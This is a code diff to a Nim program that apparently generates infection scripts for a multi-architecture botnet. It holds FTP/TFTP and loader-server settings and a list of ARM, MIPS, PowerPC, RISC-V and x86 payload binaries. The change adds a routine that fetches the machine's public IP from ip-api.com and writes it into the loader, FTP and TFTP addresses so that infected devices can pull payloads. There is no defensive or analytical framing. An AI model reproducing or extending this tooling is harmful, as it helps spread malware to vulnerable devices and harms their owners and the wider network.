@@ -2,7 +2,8 @@ import os
 import parsetoml
 
 import strutils
-
+import httpclient
+import json
 
 var ftplog, ftppass, loaderserver, shell_name, binaryname, ftp, tftp: string
 var shnamesecond: string
@@ -11,6 +12,8 @@ var shnamesecond: string
 let archs = [
   "arm5.bin",
   "arm6.bin",
+  "x32.bin",
+  "x86_64.bin",
   "arm7.bin",
   "mips.bin",
   "mips32le.bin",
@@ -18,9 +21,16 @@ let archs = [
   "ppc64.bin",
   "riscv.bin",
   "s390x.bin",
-  "x32.bin",
-  "x86_64.bin",
   ]
+
+
+proc getIp(): string =
+    var client = newHttpClient()
+    let response = client.get("http://ip-api.com/json/?fields=query")
+    let data = response.body.parseJson()
+    let ip = data["query"].str
+    return ip
+
 
 
 
@@ -37,6 +47,14 @@ proc config() =
 
   shnamesecond = temp_shell_name
   shell_name = "./bin/" & temp_shell_name
+  loaderserver = loaderserver.replace("0.0.0.0",getIp())
+  ftp = ftp.replace("0.0.0.0",getIp())
+  tftp = tftp.replace("0.0.0.0",getIp())
+
+
+
+
+
 
 
 proc create(): string =
@@ -80,4 +98,3 @@ proc create(): string =
 
 config()
 let _ = create()
-
